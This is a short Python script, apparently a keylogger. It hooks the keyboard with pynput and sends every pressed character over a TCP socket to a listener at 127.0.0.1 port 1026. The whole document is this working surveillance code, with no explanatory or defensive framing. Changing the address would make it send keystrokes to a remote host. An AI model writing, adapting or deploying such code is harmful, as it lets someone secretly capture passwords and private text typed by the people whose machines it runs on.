import socket
import sys
from pynput import keyboard

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 1026))


def on_press(key):
    s.send(bytes(key.char, 'utf-8'))


with keyboard.Listener(on_press=on_press)as listener:
    listener.join()
